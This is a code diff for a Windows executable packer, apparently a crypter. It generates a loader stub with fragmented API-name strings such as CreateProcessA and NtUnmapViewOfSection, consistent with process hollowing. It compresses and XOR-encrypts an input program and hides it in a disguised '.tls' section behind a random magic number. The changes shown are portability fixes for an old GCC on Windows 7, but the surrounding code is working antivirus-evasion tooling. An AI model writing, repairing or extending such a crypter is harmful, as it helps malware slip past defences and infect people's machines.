@@ -2,12 +2,13 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
-#include <stdint.h>
 #include <vector>
 #include <string>
 #include <fstream>
 #include <iostream>
 #include <time.h>
+
+/* Compatible avec GCC 4.4.7 sur Windows 7 */
 
 #pragma pack(push, 1)
 struct PackedSection {
@@ -21,7 +22,7 @@ struct PackedSection {
 typedef LONG (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
 
 DWORD generateObfuscatedMagic() {
-    srand(time(NULL) ^ GetTickCount());
+    srand((unsigned int)(time(NULL) ^ GetTickCount()));
     return 0x12000000 | (rand() & 0x00FFFFFF);
 }
 
@@ -30,7 +31,8 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     if (!f) return;
 
     fprintf(f, "#include <windows.h>\n");
-    fprintf(f, "#include <stdio.h>\n\n");
+    fprintf(f, "#include <stdio.h>\n");
+    fprintf(f, "#include <string.h>\n\n");
 
     fprintf(f, "#define S1 \"Cre\" \"ate\" \"Pro\" \"cess\" \"A\"\n");
     fprintf(f, "#define S2 \"Nt\" \"Unmap\" \"View\" \"Of\" \"Section\"\n");
@@ -116,7 +118,7 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "        temp2 = sections[i].Characteristics;\n");
     fprintf(f, "        if (sections[i].SizeOfRawData > 1000000) {\n");
     fprintf(f, "            struct PackedSection* testSec = (struct PackedSection*)(fileData + sections[i].PointerToRawData);\n");
-    fprintf(f, "            if (testSec->magic == 0x%08X) {\n", magic);
+    fprintf(f, "            if (testSec->magic == 0x%08lXUL) {\n", (unsigned long)magic);
     fprintf(f, "                packedSec = testSec;\n");
     fprintf(f, "                packedData = (unsigned char*)packedSec + sizeof(struct PackedSection);\n");
     fprintf(f, "                break;\n");
@@ -331,7 +333,7 @@ private:
 
             if (memcmp(sections[i].Name, ".rsrc", 5) == 0) {
                 printf("[*] Found .rsrc section in original file\n");
-                printf("    Size: %lu bytes\n", sections[i].SizeOfRawData);
+                printf("    Size: %lu bytes\n", (unsigned long)sections[i].SizeOfRawData);
 
                 memcpy(&originalResourceSection, &sections[i], sizeof(IMAGE_SECTION_HEADER));
 
@@ -439,7 +441,7 @@ private:
         return compressed;
     }
 
-    void encryptXOR(std::vector<BYTE>& data, const uint32_t key[4]) {
+    void encryptXOR(std::vector<BYTE>& data, const DWORD key[4]) {
         const BYTE* keyBytes = reinterpret_cast<const BYTE*>(key);
         size_t keyLen = 16;
 
@@ -462,7 +464,8 @@ private:
             return false;
         }
 
-        size_t stubSize = stubFile.tellg();
+        std::streampos stubSizePos = stubFile.tellg();
+        size_t stubSize = static_cast<size_t>(stubSizePos);
         stubFile.seekg(0, std::ios::beg);
 
         std::vector<BYTE> stubData(stubSize);
@@ -510,7 +513,7 @@ private:
         newSections.push_back(packedSection);
 
         int numNewSections = hasResources ? 2 : 1;
-        ntHeaders->FileHeader.NumberOfSections += numNewSections;
+        ntHeaders->FileHeader.NumberOfSections = ntHeaders->FileHeader.NumberOfSections + numNewSections;
 
         IMAGE_SECTION_HEADER* finalSection = &newSections[newSections.size() - 1];
         ntHeaders->OptionalHeader.SizeOfImage = alignValue(finalSection->VirtualAddress + finalSection->Misc.VirtualSize,
@@ -580,7 +583,8 @@ private:
             return false;
         }
 
-        fileSize = static_cast<DWORD>(file.tellg());
+        std::streampos fileSizePos = file.tellg();
+        fileSize = static_cast<DWORD>(fileSizePos);
         file.seekg(0, std::ios::beg);
 
         inputFile.resize(fileSize);
@@ -676,7 +680,7 @@ public:
         printf("[*] Section name: %s\n", sectionName);
 
         magic = generateObfuscatedMagic();
-        printf("[*] Generated magic: 0x%08X\n", magic);
+        printf("[*] Generated magic: 0x%08lX\n", (unsigned long)magic);
 
         printf("[*] Compressing with RLE...\n");
         std::vector<BYTE> compressed = compressRLE(inputFile);
@@ -684,10 +688,10 @@ public:
                (unsigned long)compressed.size(),
                (100.0 * compressed.size() / fileSize));
 
-        uint32_t randomKey[4];
-        srand(time(NULL) ^ GetTickCount());
+        DWORD randomKey[4];
+        srand((unsigned int)(time(NULL) ^ GetTickCount()));
         for (int i = 0; i < 4; i++) {
-            randomKey[i] = (rand() << 16) | rand();
+            randomKey[i] = ((DWORD)rand() << 16) | (DWORD)rand();
         }
 
         printf("[*] Encrypting payload with random key...\n");
@@ -727,7 +731,7 @@ public:
         printf("[+] Original size:  %lu bytes\n", (unsigned long)fileSize);
         printf("[+] Compression:    %.1f%%\n", (100.0 * compressed.size() / fileSize));
         printf("[+] Section name:   .tls\n");
-        printf("[+] Magic number:   0x%08X\n", magic);
+        printf("[+] Magic number:   0x%08lX\n", (unsigned long)magic);
         if (hasResources) {
             printf("[+] Resources:      Preserved (%lu bytes)\n", (unsigned long)originalResourceData.size());
         } else {
